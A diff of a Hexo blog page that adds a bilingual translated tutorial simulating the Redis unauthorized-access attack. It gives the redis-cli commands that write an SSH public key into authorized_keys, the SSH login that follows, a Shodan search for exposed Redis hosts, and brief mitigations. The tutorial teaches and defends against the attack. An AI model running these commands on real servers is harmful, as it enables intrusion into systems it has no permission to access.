+<h3 id="为什么同一个原型别人理解的功能和我理解的不同"><a href="#为什么同一个原型别人理解的功能和我理解的不同" class="headerlink" title="为什么同一个原型别人理解的功能和我理解的不同"></a>为什么同一个原型别人理解的功能和我理解的不同</h3><p>就像莎士比亚说的：“一千个读者就有一千个哈姆雷特”，每个人理解方面都会有偏差。最好的状态就是所以功能开发的原因都了解清楚。要不然做一个连你自己都觉得没用的功能，后面砍掉了你也无处讲理去。而实现的细节我们可以向产品以及组长校对自己的理解。才会最大限度的减少误差。</p>
+<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>不管在工作中还是在平时生活中，我们应该深入做事的原因。如果是帮忙，需要完全确认自己的理解是否偏差，开发的细节是否有遗漏。沟通的成本确实是很大。但是动脑动嘴比动手来的轻松很多。</p>
+
+          
         
       
     </div>
@@ -1845,15 +1958,142 @@ Stream
       
         
           
-          Redis, is an open source, widely popular data structure tool that can be used as an in-memory distributed database, message broker or cache. Since it 
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/翻译/redis-unauthorized-access-vulnerability-simulation/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+            <p>Redis, is an open source, widely popular data structure tool that can be used as an in-memory distributed database, message broker or cache. Since it is designed to be accessed inside trusted environments, it should not be exposed on the Internet. However, some Redis’ are bind to public interface and even has no password authentication protection.</p>
+<p>Redis是一个开源的、广泛流行的数据结构工具，可以用作内存中的分布式数据库、消息代理或缓存。因为它被设计为在受信任的环境中访问，所以不应该在 Internet 上公开。然而，一些 Redis 绑定到公共接口，甚至没有密码身份验证保护。</p>
+<p>Under certain conditions, if Redis runs with the root account (or not even), attackers can write an SSH public key file to the root account, directly logging on to the victim server through SSH. This may allow hackers to gain server privileges, delete or steal data, or even lead to an encryption extortion, critically endangering normal business services.</p>
+<p>在某些条件下，如果Redis使用 root 帐户运行（甚至不使用），攻击者可以向根帐户写入 SSH 公钥文件，直接通过 SSH 登录到受害服务器。这可能使黑客获得服务器特权，删除或窃取数据，甚至导致加密勒索，严重危害正常的业务服务。</p>
+<p>The simplified flow of this exploit is:</p>
+<ul>
+<li>Login to a unprotected Redis</li>
+<li>Change it’s backup location to .ssh directory — Write the SSH Keys to new backup location</li>
+<li>Remote connect and login to the target server using SSH key</li>
+</ul>
+<p>We should already be familiar how automatic SSH login with private + public keys works.</p>
+<p>简化实现流程如下：</p>
+<ul>
+<li>登录到一个无保护的 Redis</li>
+<li>将备份位置更改为 .ssh 目录 —— 将SSH密钥写入新的备份位置</li>
+<li>使用 SSH 密钥远程连接并登录到目标服务器</li>
+</ul>
+<p>我们应该已经熟悉了如何使用私有+公钥自动登录 SSH。</p>
+<h2 id="Simulation"><a href="#Simulation" class="headerlink" title="Simulation"></a>Simulation</h2><h2 id="模拟"><a href="#模拟" class="headerlink" title="模拟"></a>模拟</h2><p>Now let’s get our feet wet and set up a target machine. We’ll need two machines, they can be real machines, virtual machines, or remote machines (VPS). As long as the attack end is able to ping the target end, we are good.</p>
+<p>现在让我们先把做好模拟前准备。我们需要两台机器，它们可以是真正的机器、虚拟机或远程机器(VPS)。只要攻击端能够 ping 目标端就可以了。</p>
+<p>Environment setup for this example:</p>
+<ul>
+<li>Target Machine: Redis-3.2.11 on Ubuntu</li>
+<li>Attack Machine: Platform you like with Redis (I used Kali)</li>
+</ul>
+<p>示例中的环境如下：</p>
+<ul>
+<li>目标机器：ubuntu 下有 Redis-3.2.11</li>
+<li>攻击机器：你喜欢的平台与 Redis(我用的是 Kali)</li>
+</ul>
+<h3 id="Set-Up-Target-Machine"><a href="#Set-Up-Target-Machine" class="headerlink" title="Set Up Target Machine:"></a>Set Up Target Machine:</h3><h3 id="设定目标机器："><a href="#设定目标机器：" class="headerlink" title="设定目标机器："></a>设定目标机器：</h3><p>First, let us set up the target machine with Redis. Download source code by</p>
+<p>首先，让我们配置目标机器的 Reids。下载源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-3.2.11.tar.gz</span><br></pre></td></tr></table></figure>
+<p>Extract and build</p>
+<p>提取和构建</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar xzf redis-3.2.11.tar.gz cd redis-3.2.11</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+<p>After make, we use our favorite editor to open <code>redis.conf</code> in <code>redis-3.2.11</code> folder. In order to be remotely accessed, we will need to comment out line <code>bind 127.0.0.1</code> and disable <code>protected-mode</code> as shown below.</p>
+<p>编译后，我们使用我们最喜欢的编辑器打开 <code>redis-3.2.11</code> 文件夹 的 <code>redis.conf</code>。为了远程访问，我们需要注释掉 <code>bind 127.0.0.1</code> 行，并禁用 <code>protected-mode</code>，如下所示。</p>
+<p><img src="/img/review/0_UqCMKzd401p_9xgf.png" alt></p>
+<p>Now fire up Redis with the configuration file we just edited. Note that <code>redis-server</code> is in <code>redis-3.2.11/src</code>.</p>
+<p>现在用我们刚刚编辑的配置文件启动Redis。注意 <code>redis-server</code> 在 <code>redis-3.2.11/src</code> 中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src/redis-server redis.conf</span><br></pre></td></tr></table></figure>
+<p>So far, we have finished setting up the target server. Additionally, we should also check if we have <code>.ssh</code> folder. If not, we should create it for the attack later.</p>
+<p>到目前为止，我们已经完成了目标服务器的设置。此外，我们还应该检查我们是否有 <code>.ssh</code>的文件夹。如果没有，我们应该为以后的攻击创建它。</p>
+<h3 id="Attack-Machine"><a href="#Attack-Machine" class="headerlink" title="Attack Machine:"></a>Attack Machine:</h3><h3 id="攻击机器："><a href="#攻击机器：" class="headerlink" title="攻击机器："></a>攻击机器：</h3><p>First, make sure we can ping the target. Then, we will generate a private key and public key for SSHing into the target machine later. Run the following command to generate SSH keys and leave passphrase empty.</p>
+<p>首先，确保我们能锁定目标。然后，我们将生成私钥和公钥，以便稍后将其插入目标机器。运行以下命令生成SSH密钥，并保留密码为空。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+<p>Next, enter the <code>.ssh</code> folder. If you are root user, enter <code>/.ssh</code>, otherwise <code>~/.ssh</code>, then copy the private key in to <code>temp.txt</code>.</p>
+<p>下一步，进入 <code>.ssh</code> 目录。如果你是 root 用户，进入 <code>/.ssh</code>，其他的进入 <code>~/.ssh</code>。复制私钥到 <code>temp.txt</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; temp.txt</span><br></pre></td></tr></table></figure>
+<p>Some may be wondering that why do we put two blank lines before and after the public key? We will leave that as a mystery for right now if you don’t know :)</p>
+<p>有些人可能想知道，为什么在公钥之前和之后要放两行空白?如果你不知道，我们暂时把它作为一个谜 :)</p>
+<p><img src="/img/review/0_kj5v1UOnDs4_1B-4.png" alt></p>
+<p>Good! So far we have generated a pair a keys, we will need to find a way to smuggle the public key to the Redis server (target machine.)</p>
+<p>好了！到目前为止，我们已经生成了一对密钥，我们将需要找到一种方法将公钥偷运到Redis服务器(目标机器)。</p>
+<p>We are going to use <code>redis-cli</code>, the Redis command line interface, to send commands to Redis and read the replies sent by the server directly in the terminal.</p>
+<p>我们将使用 <code>redis-cli</code>，即 Redis 命令行接口，向 Redis 发送命令，并直接读取终端服务器发送的响应。</p>
+<p>Run the following commands in <code>redis-3.2.11/src</code> folder. (Or depending where we are, we can always specify the path to the files we use)</p>
+<p>在 <code>redis-3.2.11/src</code> 文件夹中运行以下命令。(或者根据我们的位置，我们总是可以指定我们使用的文件的路径)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /.ssh/temp.txt | redis-cli -h 203.137.255.255 -x set s-key</span><br></pre></td></tr></table></figure>
+<p>Here, let’s take a look at the command. We use <code>-h</code> flag to specify the remote Redis server IP so that <code>redis-cli</code> knows where to connect and send commands. The part after <code>-x</code> is saying that we are setting the key in redis named <code>s-key</code> with the value in <code>temp.txt</code>.</p>
+<p>在这里，让我们看一下命令。我们使用 <code>-h</code> 标志来指定远程 Redis 服务器 IP，以便 <code>redis-cli</code> 知道在何处连接和发送命令。<code>-x</code> 后面的部分表示，我们正在设置 redis 中的键名为 <code>s-key</code>，其值位于 <code>temp.txt</code> 中。</p>
+<p><img src="/img/review/0_RXLExaGb28VkI0xO.png" alt></p>
+<p>Yea, we have a key with our SSH key sneaked in! Let’s connect to the Redis and play around its configuration. Use <code>redis-cli</code> to connect to the Redis server again.</p>
+<p>是的，我们有一个密钥，SSH 密钥偷偷溜进来了!让我们连接到Redis并研究它的配置。再次使用 <code>redis-cli</code> 连接到 Redis 服务器。</p>
+<p><img src="/img/review/0_ly-kkskrTIJ72LFM.png" alt></p>
+<p>Looking at the above screenshot, we first verify the value of the key <code>s-key</code> by using the command <code>GET s-key</code>, which is what we want – the public key with two blank lines before and after. Then I tried the command “dir” just to see what it says (kidding). What we actually want to do here is to get the value of “s-key” (SSH public key) stored in the <code>.ssh</code> folder so that we can remote SSH login to the target machine whithout having to type the password.</p>
+<p>查看上面的屏幕截图，我们首先使用命令 <code>GET s-key</code> 来验证键 <code>s-key</code> 的值，这正是我们想要的——前后各有两行空白的公钥。然后，我尝试命令 “dir”，只是为了看看它说了什么(开玩笑)。这里我们真正想做的是获取存储在 <code>.ssh</code> 文件夹中的“s-key”(SSH公钥)的值，这样我们就可以远程ssh登录到目标机器，而不需要输入密码。</p>
+<p>Thus, we will do this:</p>
+<p>因此，我们将这样做:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG GET dir # get your redis directory</span><br><span class="line"># In the output of above command &quot;/home/xxxx/redis-3.2.11/src&quot; is the directory where redis server is installed. CONFIG SET dir</span><br><span class="line">/home/xxxx/.ssh # set the backup location to the .ssh folder</span><br><span class="line">(or) CONFIG SET dir /root/.ssh CONFIG SET dbfilename authorized_keys</span><br><span class="line"># lastly we back our data containing our &quot;s-key&quot; key-value pair up in the .ssh folder</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>The authorized_keys file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured Source: <a href="https://www.ssh.com/ssh/authorized_keys/" target="_blank" rel="noopener">ssh.com</a><br>The screenshot shown above already demonstrates the steps mentioned here.</p>
+</blockquote>
+<blockquote>
+<p>SSH中的 authorized_keys 文件指定了 SSH 密钥，可用于登录到文件配置源的用户帐户: <a href="https://www.ssh.com/ssh/authorized_keys/" target="_blank" rel="noopener">ssh.com</a><br>上面的截图已经演示了这里提到的步骤。</p>
+</blockquote>
+<h3 id="Harvest-Time"><a href="#Harvest-Time" class="headerlink" title="Harvest Time"></a>Harvest Time</h3><h3 id="结果时间"><a href="#结果时间" class="headerlink" title="结果时间"></a>结果时间</h3><p>On Attack Machine, try to SSH in the Target Machine using the following command.</p>
+<p>在攻击机器上，尝试使用下面的命令在目标机器上SSH。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># command: private key username@server IP</span><br><span class="line">ssh -i id_rsa username@203.137.255.255</span><br></pre></td></tr></table></figure>
+<p><img src="/img/review/0_xTWYFYecso8XJKdI.png" alt></p>
+<p>YAS! As we can see, we have a successful auto-login with SSH keys! Voila, we have now completed the attack simulation. 😃</p>
+<p>好，可以看到，我们成功地使用 SSH 密钥自动登录!瞧，我们现在已经完成了攻击模拟。😃</p>
+<p>(Smiley face actually means that I’m finally almost done writing this up 😂)</p>
+<p>(笑脸实际上意味着我差不多写完了😂)</p>
+<p>At the end of this section, I would like to show what is Redis’s backup file look like.</p>
+<p>在本节的最后，我想展示一下什么是 Redis 的备份文件。</p>
+<p><img src="/img/review/0_wjEeD2SSdTnymBVT.png" alt></p>
+<p>Notice the unreadable characters? Add “\n\n” before and after the key content was just to be safe and separate it from other “stuff” so that it can be parsed correctly. 👌</p>
+<p>注意到这些不可读的字符了吗?在关键内容之前和之后添加“\n\n”只是为了安全起见，并将其与其他“内容”分开，以便正确解析。</p>
+<h2 id="Use-Search-Engine-to-find-Vulnerable-Redis-Servers"><a href="#Use-Search-Engine-to-find-Vulnerable-Redis-Servers" class="headerlink" title="Use Search Engine to find Vulnerable Redis Servers"></a>Use Search Engine to find Vulnerable Redis Servers</h2><h2 id="使用搜索引擎查找易受攻击的Redis服务器"><a href="#使用搜索引擎查找易受攻击的Redis服务器" class="headerlink" title="使用搜索引擎查找易受攻击的Redis服务器"></a>使用搜索引擎查找易受攻击的Redis服务器</h2><p>Alrighty, as I mentioned, we are going to use <a href="https://www.shodan.io/" target="_blank" rel="noopener">Shodan</a> to search servers that has Redis footprint (characteristics).</p>
+<p>好的，正如我提到的，我们将使用 <a href="https://www.shodan.io/" target="_blank" rel="noopener">Shodan</a> 来搜索具有 Redis footprint(特征)的服务器。</p>
+<p>Let us do a simple search by Redis’ default port.</p>
+<p>让我们做一个简单的搜索，通过Redis的默认端口。</p>
+<p><img src="/img/review/0_ueth-xQWtxJobzwL.png" alt></p>
+<p>Looks like we have 75,665 search results. Aaaaaand guess what! Right down there (not shown but we can see it if we scroll down) there are TONS of host that has NO password protection!!</p>
+<p>看起来我们有 75,665 个搜索结果。猜猜看!就在那里(没有显示，但我们可以看到，如果我们向下滚动)有些主机没有密码保护!!</p>
+<p>This vulnerability was found years ago and still countless of machines are opening up themselves in such an easy way for attackers to have fun in there server…</p>
+<p>这个漏洞是几年前发现的，仍然有无数的机器以这种简单的方式打开自己，让攻击者在那里的服务器中得到乐趣…</p>
+<p>According to Shodan, there are around <strong>56,000 unprotected</strong> Redis instances in 2015.</p>
+<p>根据 Shodan 的数据，2015 年大约有 5,6000 个不受保护的Redis实例。</p>
+<p><img src="/img/review/0_C2n27eAOGFkK79IU.png" alt></p>
+<p>According to ZoomEye, the distribution of the instances is.</p>
+<p>根据 ZoomEye，实例的分布是。</p>
+<p><img src="img/0_m19lcFYeFOhB_Nui.png" alt></p>
+<p>According to ZoomEye, the top ranking countries of these instances are: China, USA, Germany…</p>
+<p>ZoomEye表示，这些例子中排名最高的国家是:中国、美国、德国……</p>
+<p><img src="img/0_hxf9oaOFJVDohZMC.png" alt></p>
+<p>Okay, back to the business. So how do we verify if a server is protected using python? It turns out to be fairly simple.</p>
+<p>好了，回到正题。那么，我们如何验证是否使用 python 保护服务器呢？结果相当简单。</p>
+<ol>
+<li>Use socket to connect to the target IP</li>
+<li>Perform a GET request</li>
+<li><p>If the server is unprotected, you GET request will succeed; otherwise it will fail</p>
+</li>
+<li><p>使用套接字连接到目标IP</p>
+</li>
+<li>执行GET请求</li>
+<li>如果服务器不受保护，您的GET请求将成功;否则就会失败</li>
+</ol>
+<p><img src="img/0_C4_dcCGWAPWxFbaU.png" alt></p>
+<h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><h2 id="减轻"><a href="#减轻" class="headerlink" title="减轻"></a>减轻</h2><ul>
+<li>Don’t bind to 0.0.0.0</li>
+<li>If you have to, change the default port (6379)</li>
+<li><p>Set a password (for everything)</p>
+</li>
+<li><p>不要绑定 0.0.0.0</p>
+</li>
+<li>如果有必要的话，修改默认端口 (6379)</li>
+<li>为所有的 Reids 设置密码</li>
+</ul>
+<p>Sep 11, 2018 （2018-09-11）</p>
+<p>author: Victor Zhu</p>
+<p>link: <a href="https://medium.com/@Victor.Z.Zhu/redis-unauthorized-access-vulnerability-simulation-victor-zhu-ac7a71b2e419" target="_blank" rel="noopener">https://medium.com/@Victor.Z.Zhu/redis-unauthorized-access-vulnerability-simulation-victor-zhu-ac7a71b2e419</a></p>
+
+          
         
       
     </div>
@@ -2014,13 +2254,14 @@ Stream
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2020</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
   <span class="author" itemprop="copyrightHolder">jani</span>
 
   
+  <a href="http://www.miitbeian.gov.cn/">粤ICP备17086938号-1</a>
 </div>
 
 
